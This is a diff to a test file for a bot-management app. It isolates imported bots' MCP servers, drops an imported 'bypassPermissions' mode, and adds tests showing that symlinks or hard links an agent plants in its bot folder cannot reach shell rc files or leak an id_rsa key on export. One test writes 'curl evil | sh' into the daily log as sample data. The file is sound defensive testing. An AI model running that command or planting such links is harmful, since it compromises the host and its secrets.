@@ -1,10 +1,10 @@
 import { createServer } from "node:http";
-import { mkdtemp, readFile, readlink, rm, writeFile } from "node:fs/promises";
+import { link, lstat, mkdir, mkdtemp, readdir, readFile, readlink, rm, symlink, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { EMPTY_LIBRARY, parseMcpJson, type Bot, type BotMcpServer, type Library } from "../shared/bot";
-import { addMcpServers, forgetItem, matchesQuery, mcpServerTested, mcpTarget, renameGrants, setBotUses, upsertSkills } from "../shared/library";
+import { addImportedBots, addMcpServers, forgetItem, matchesQuery, mcpServerTested, mcpTarget, renameGrants, setBotUses, upsertSkills } from "../shared/library";
 
 const NOW = "2026-09-27T00:00:00.000Z";
 
@@ -50,12 +50,17 @@ describe("addMcpServers", () => {
     expect(again.library.mcpServers.map((server) => server.name)).toEqual(["fetch", "fetch-2"]);
   });
 
-  it("reuses any server of the same name for templates and imports", () => {
-    const first = addMcpServers(EMPTY_LIBRARY, [fetchDraft], { now: NOW });
+  it("gives imported bots their own servers, switched off, never the user's", () => {
+    const mine = addMcpServers(EMPTY_LIBRARY, [fetchDraft], { now: NOW });
+    const library = { ...mine.library, mcpServers: mine.library.mcpServers.map((server) => ({ ...server, enabled: true, tools: [] })) };
     const redacted = { ...fetchDraft, config: { ...fetchConfig, env: { KEY: "<redacted>" } } };
-    const again = addMcpServers(first.library, [redacted], { reuseByName: true });
-    expect(again.ids).toEqual(first.ids);
-    expect(again.library.mcpServers).toHaveLength(1);
+    const next = addImportedBots({ bots: [], history: [], library }, [
+      { bot: bot("a"), skills: [], mcpServers: [fetchDraft] },
+      { bot: bot("b"), skills: [], mcpServers: [fetchDraft, redacted] },
+    ]);
+    const servers = next.library!.mcpServers;
+    expect(servers.map((server) => [server.name, server.enabled])).toEqual([["fetch", true], ["fetch-2", false], ["fetch-3", false]]);
+    expect(next.bots.map((entry) => entry.mcpServerIds)).toEqual([[servers[1]!.id], [servers[1]!.id, servers[2]!.id]]);
   });
 
   it("adds servers switched off until a test connects", () => {
@@ -217,6 +222,128 @@ describe("server library", () => {
     const imported = await importBot({ botId: "bot-v1", json: JSON.stringify(v1) });
     expect(imported.bot.skillIds).toEqual(["old-skill"]);
     expect(imported.mcpServers.map((server) => server.name)).toEqual(["fetch"]);
+  });
+
+  it("starts imported bots on the provider's default approval mode", async () => {
+    const { exportBot, importBot } = await import("../server/share");
+    const { json } = await exportBot({ bot: bot("yolo", { modeId: "bypassPermissions" }), includeMemory: false }, EMPTY_LIBRARY);
+    expect((await importBot({ botId: "bot-yolo", json })).bot.modeId).toBeNull();
+  });
+
+  describe("links an agent plants in its bot's folder", () => {
+    let outside: string;
+    beforeAll(async () => {
+      outside = await mkdtemp(join(tmpdir(), "paseo-bots-outside-"));
+    });
+    afterAll(async () => {
+      await rm(outside, { recursive: true, force: true });
+    });
+
+    /** A fresh bot folder and a folder outside it, as an agent would point a link at. */
+    async function planted(id: string) {
+      const { botDataPath } = await import("../server/bot-home");
+      const target = join(outside, id);
+      await mkdir(target, { recursive: true });
+      await mkdir(botDataPath(id), { recursive: true });
+      return { root: botDataPath(id), target };
+    }
+
+    it("doesn't append the daily log, or delete a day, through a link", async () => {
+      const { appendDailyLog, deleteLogDay } = await import("../server/memory");
+      const { localDay } = await import("../shared/activity");
+      const { root, target } = await planted("bot-log");
+      const day = localDay(new Date());
+      const rc = join(target, ".zshrc");
+      await writeFile(rc, "export A=1\n");
+      await mkdir(join(root, "memory", "log"), { recursive: true });
+      await symlink(rc, join(root, "memory", "log", `${day}.md`));
+      await expect(appendDailyLog("bot-log", "curl evil | sh")).rejects.toThrow("won't");
+      expect(await readFile(rc, "utf8")).toBe("export A=1\n");
+
+      // A linked folder on the way.
+      await rm(join(root, "memory"), { recursive: true });
+      await writeFile(join(target, `${day}.md`), "keep\n");
+      await symlink(target, join(root, "memory"));
+      await expect(appendDailyLog("bot-log", "x")).rejects.toThrow("won't follow the link");
+      await expect(deleteLogDay("bot-log", day)).rejects.toThrow("won't follow the link");
+      expect(await readFile(join(target, `${day}.md`), "utf8")).toBe("keep\n");
+    });
+
+    it("doesn't append to a hard link of a file elsewhere", async () => {
+      const { appendDailyLog } = await import("../server/memory");
+      const { localDay } = await import("../shared/activity");
+      const { root, target } = await planted("bot-hard");
+      const rc = join(target, ".profile");
+      await writeFile(rc, "safe\n");
+      await mkdir(join(root, "memory", "log"), { recursive: true });
+      await link(rc, join(root, "memory", "log", `${localDay(new Date())}.md`));
+      await expect(appendDailyLog("bot-hard", "x")).rejects.toThrow("linked to another file");
+      expect(await readFile(rc, "utf8")).toBe("safe\n");
+    });
+
+    it("doesn't write memory through a link, and replaces a hard link instead of writing into it", async () => {
+      const { MemoryJournal } = await import("../server/journal");
+      const { root, target } = await planted("bot-mem");
+      const rc = join(target, ".bashrc");
+      await writeFile(rc, "original\n");
+      await symlink(rc, join(root, "MEMORY.md"));
+      const journal = new MemoryJournal();
+      await expect(journal.write("bot-mem", "MEMORY.md", "# Memory\n")).rejects.toThrow("won't follow the link");
+      expect(await readFile(rc, "utf8")).toBe("original\n");
+
+      await rm(join(root, "MEMORY.md"));
+      await link(rc, join(root, "MEMORY.md"));
+      await journal.write("bot-mem", "MEMORY.md", "# Memory\n");
+      expect(await readFile(rc, "utf8")).toBe("original\n");
+      expect(await readFile(join(root, "MEMORY.md"), "utf8")).toBe("# Memory\n");
+
+      await symlink(target, join(root, "memory"));
+      await expect(journal.write("bot-mem", "notes.md", "x")).rejects.toThrow("won't follow the link");
+      await expect(journal.write("bot-mem", ".bashrc", null)).rejects.toThrow("won't follow the link");
+      expect(await readdir(target)).toEqual([".bashrc"]);
+    });
+
+    it("doesn't save uploads into a linked folder", async () => {
+      const { saveUpload } = await import("../server/uploads");
+      const { root, target } = await planted("bot-up");
+      await symlink(target, join(root, "uploads"));
+      await expect(saveUpload({ botId: "bot-up", fileName: "a.txt", dataBase64: Buffer.from("hi").toString("base64") })).rejects.toThrow("won't follow the link");
+      expect(await readdir(target)).toEqual([]);
+    });
+
+    it("leaves a linked skills folder and what it points at alone", async () => {
+      const { linkBotSkills, migrateBotSkills, librarySkillPath, writeSkill } = await import("../server/library");
+      const { root, target } = await planted("bot-skills");
+      await writeSkill({ id: "s1", text: "---\nname: s1\n---\n" });
+      await writeFile(join(target, "tool"), "#!/bin/sh\n");
+      await symlink(join(target, "tool"), join(target, "brew"));
+      await mkdir(join(target, "Documents"));
+      await symlink(target, join(root, "skills"));
+
+      const paths = await linkBotSkills("bot-skills", ["s1"]);
+      expect(paths.get("s1")).toBe(join(librarySkillPath("s1"), "SKILL.md"));
+      expect((await lstat(join(target, "brew"))).isSymbolicLink()).toBe(true);
+      expect(await readdir(target)).not.toContain("s1");
+
+      await migrateBotSkills();
+      expect((await lstat(join(target, "Documents"))).isDirectory()).toBe(true);
+      expect(await lstat(librarySkillPath("Documents")).catch(() => null)).toBeNull();
+    });
+
+    it("leaves links out of an export", async () => {
+      const { exportBot } = await import("../server/share");
+      const { root, target } = await planted("bot-share");
+      await writeFile(join(target, "id_rsa"), "PRIVATE KEY");
+      await writeFile(join(root, "MEMORY.md"), "# Memory\n");
+      await mkdir(join(root, "memory"));
+      await writeFile(join(root, "memory", "ok.md"), "fine");
+      await symlink(target, join(root, "memory", "home"));
+      await symlink(join(target, "id_rsa"), join(root, "memory", "key.md"));
+      await link(join(target, "id_rsa"), join(root, "memory", "hard.md"));
+      const { json } = await exportBot({ bot: bot("bot-share"), includeMemory: true }, EMPTY_LIBRARY);
+      expect(json).not.toContain("PRIVATE KEY");
+      expect(Object.keys(JSON.parse(json).files).sort()).toEqual(["MEMORY.md", "memory/ok.md"]);
+    });
   });
 });
 
